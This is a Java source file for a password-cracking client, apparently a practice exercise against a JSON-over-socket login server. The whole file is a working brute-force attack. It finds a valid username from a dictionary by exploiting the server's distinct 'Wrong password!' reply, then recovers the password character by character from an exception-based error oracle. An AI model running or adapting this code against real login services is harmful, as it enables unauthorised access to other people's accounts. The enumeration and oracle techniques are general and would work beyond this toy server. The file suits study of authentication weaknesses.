package br.com.dv.passwordcracker;

import com.google.gson.Gson;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.List;

public class PasswordCracker {

    private final Gson gson = new Gson();

    public void run(String[] args) {
        InputData inputData = InputValidator.validateInputs(args);
        if (inputData == null) {
            System.out.println("Invalid input data.");
            return;
        }

        Account account = findAccountCredentials(inputData.ipAddress(), inputData.port());
        JsonUtils.printJson(account);
    }

    private Account findAccountCredentials(String ipAddress, int port) {
        try (Socket socket = new Socket(ipAddress, port);
             DataInputStream input = new DataInputStream(socket.getInputStream());
             DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {

            String login = findLogin(input, output);
            if (login == null) {
                throw new RuntimeException("Login could not be found!");
            }

            String password = findPassword(input, output, login);

            return new Account(login, password);
        } catch (Exception e) {
            System.out.println("An error occurred while trying to find account credentials: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    /*
     * The server will return "Wrong login!" if both the login and password are wrong.
     * However, if the login is correct and the password is wrong, the server will return "Wrong password!".
     * By repeatedly sending the server a wrong password for each login, we can find the correct login.
     */
    private String findLogin(DataInputStream input, DataOutputStream output) throws IOException {
        String emptyPassword = "";
        List<String> logins = DictionaryReader.readDictionary(DictionaryFile.LOGINS.filePath);

        for (String login : logins) {
            Account account = new Account(login, emptyPassword);
            ServerResponse response = sendLoginAndPassword(input, output, account);
            String result = getResult(response);

            if (result.equals(ServerResponseType.WRONG_PASSWORD.result)) {
                return login;
            }
        }
        return null;
    }

    private String findPassword(DataInputStream input, DataOutputStream output, String login) throws IOException {
        StringBuilder password = new StringBuilder();

        List<Character> characterList = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                .chars()
                .mapToObj(c -> (char) c)
                .toList();

        outerLoop:
        while (true) {
            for (Character c : characterList) {
                String testPassword = password.toString() + c;
                Account account = new Account(login, testPassword);
                ServerResponse response = sendLoginAndPassword(input, output, account);
                String result = getResult(response);

                if (result.equals(ServerResponseType.EXCEPTION.result)) {
                    password.append(c);
                    continue outerLoop;
                }

                if (result.equals(ServerResponseType.CONNECTION_SUCCESS.result)) {
                    password.append(c);
                    return password.toString();
                }
            }
        }
    }

    private ServerResponse sendLoginAndPassword(DataInputStream input, DataOutputStream output, Account account)
            throws IOException {
        String json = gson.toJson(account);
        return getResponse(input, output, json);
    }

    private ServerResponse getResponse(DataInputStream input, DataOutputStream output, String json)
            throws IOException {
        output.writeUTF(json);
        output.flush();
        String response = input.readUTF();
        return gson.fromJson(response, ServerResponse.class);
    }

    private String getResult(ServerResponse response) {
        return response.result();
    }

}
